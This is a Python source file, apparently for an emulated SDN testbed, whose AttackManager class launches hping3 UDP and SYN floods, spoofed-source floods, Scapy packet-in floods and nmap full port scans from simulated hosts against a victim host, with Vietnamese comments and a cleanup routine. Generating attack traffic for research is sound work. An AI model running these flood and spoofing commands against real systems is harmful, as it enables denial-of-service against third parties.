import random
import time

class AttackManager:
    def __init__(self, net):
        self.net = net
        self.attackers = [net.get(f'h{i}') for i in range(1, 7)]
        self.victim = net.get('h8')
        self.active_pids = []

    # ================================
    # DDoS
    # ================================
    def ddos_flood(self):
        print(f"[*] Starting DDoS flood: {len(self.attackers)} hosts -> {self.victim.IP()}")
        for attacker in self.attackers:
            for _ in range(5):  # Mỗi attacker tạo 3 luồng tấn công
            # Chạy ngầm (&), ẩn output (> /dev/null), và lấy PID ($!)
                cmd = f'hping3 --flood --udp -p 80 {self.victim.IP()} --flood > /dev/null 2>&1 & echo $!'
                pid = attacker.cmd(cmd).strip()
                self.active_pids.append((attacker, pid))

    # ================================
    # Packet-In Flood
    # ================================
    def packet_in_flood(self):
        attacker = random.choice(self.attackers)
        print(f"[*] Packet-In Flood từ {attacker.name} -> {self.victim.IP()}")
        # Scapy gửi gói tin TCP với port ngẫu nhiên liên tục
        for _ in range(5):  # Tạo nhiều luồng tấn công
            cmd = (
                f'python3 -c "from scapy.all import *; '
                f'send(IP(dst=\\"{self.victim.IP()}\\")/'
                f'TCP(sport=RandShort(), dport=RandShort()), '
                f'loop=1, verbose=0)" '
                f'> /dev/null 2>&1 & echo $!'
            )
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # Flow Table Overflow
    # ================================
    def flow_overflow(self):
        # Tấn công lấp đầy bảng flow nhanh nhất là dùng hping3 với IP nguồn giả mạo ngẫu nhiên
        attacker = random.choice(self.attackers)
        print(f"[*] Flow Table Overflow từ {attacker.name}...")
        for _ in range(10):  # Tạo nhiều luồng tấn công
            cmd = f'hping3 --flood --rand-source -S -p 80 {self.victim.IP()} > /dev/null 2>&1 & echo $!'
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # IP Spoofing
    # ================================
    def ip_spoofing(self):
        attacker = random.choice(self.attackers)
        print(f"[*] IP Spoofing từ {attacker.name}")

        for _ in range(5):  # tăng intensity
            fake_ip = f"10.0.0.{random.randint(100,200)}"
            cmd = (
                f'hping3 --flood -S -a {fake_ip} '
                f'{self.victim.IP()} --fast > /dev/null 2>&1 & echo $!'
            )
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # Port Scanning
    # ================================
    def port_scanning(self):
        attacker = random.choice(self.attackers)
        print(f"[*] Port Scanning từ {attacker.name}...")
        # Quét dồn dập nhiều port
        for _ in range(5):  # Tạo nhiều luồng tấn công
            cmd = (
                f'nmap -sT -p 1-65535 -T5 {self.victim.IP()} '
                f'> /dev/null 2>&1 & echo $!'
            )
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # STOP ALL
    # ================================
    def stop_all(self):
        print("[*] Đang dừng tất cả các tiến trình tấn công...")
        for attacker, pid in self.active_pids:
            try:
                attacker.cmd(f'kill -9 {pid}')
            except:
                pass
        # Dọn dẹp triệt để trên toàn bộ các host
        for host in self.attackers:
            host.cmd('pkill -9 hping3 nmap python3')
        self.active_pids.clear()
        print("[+] Hệ thống đã sạch tấn công.")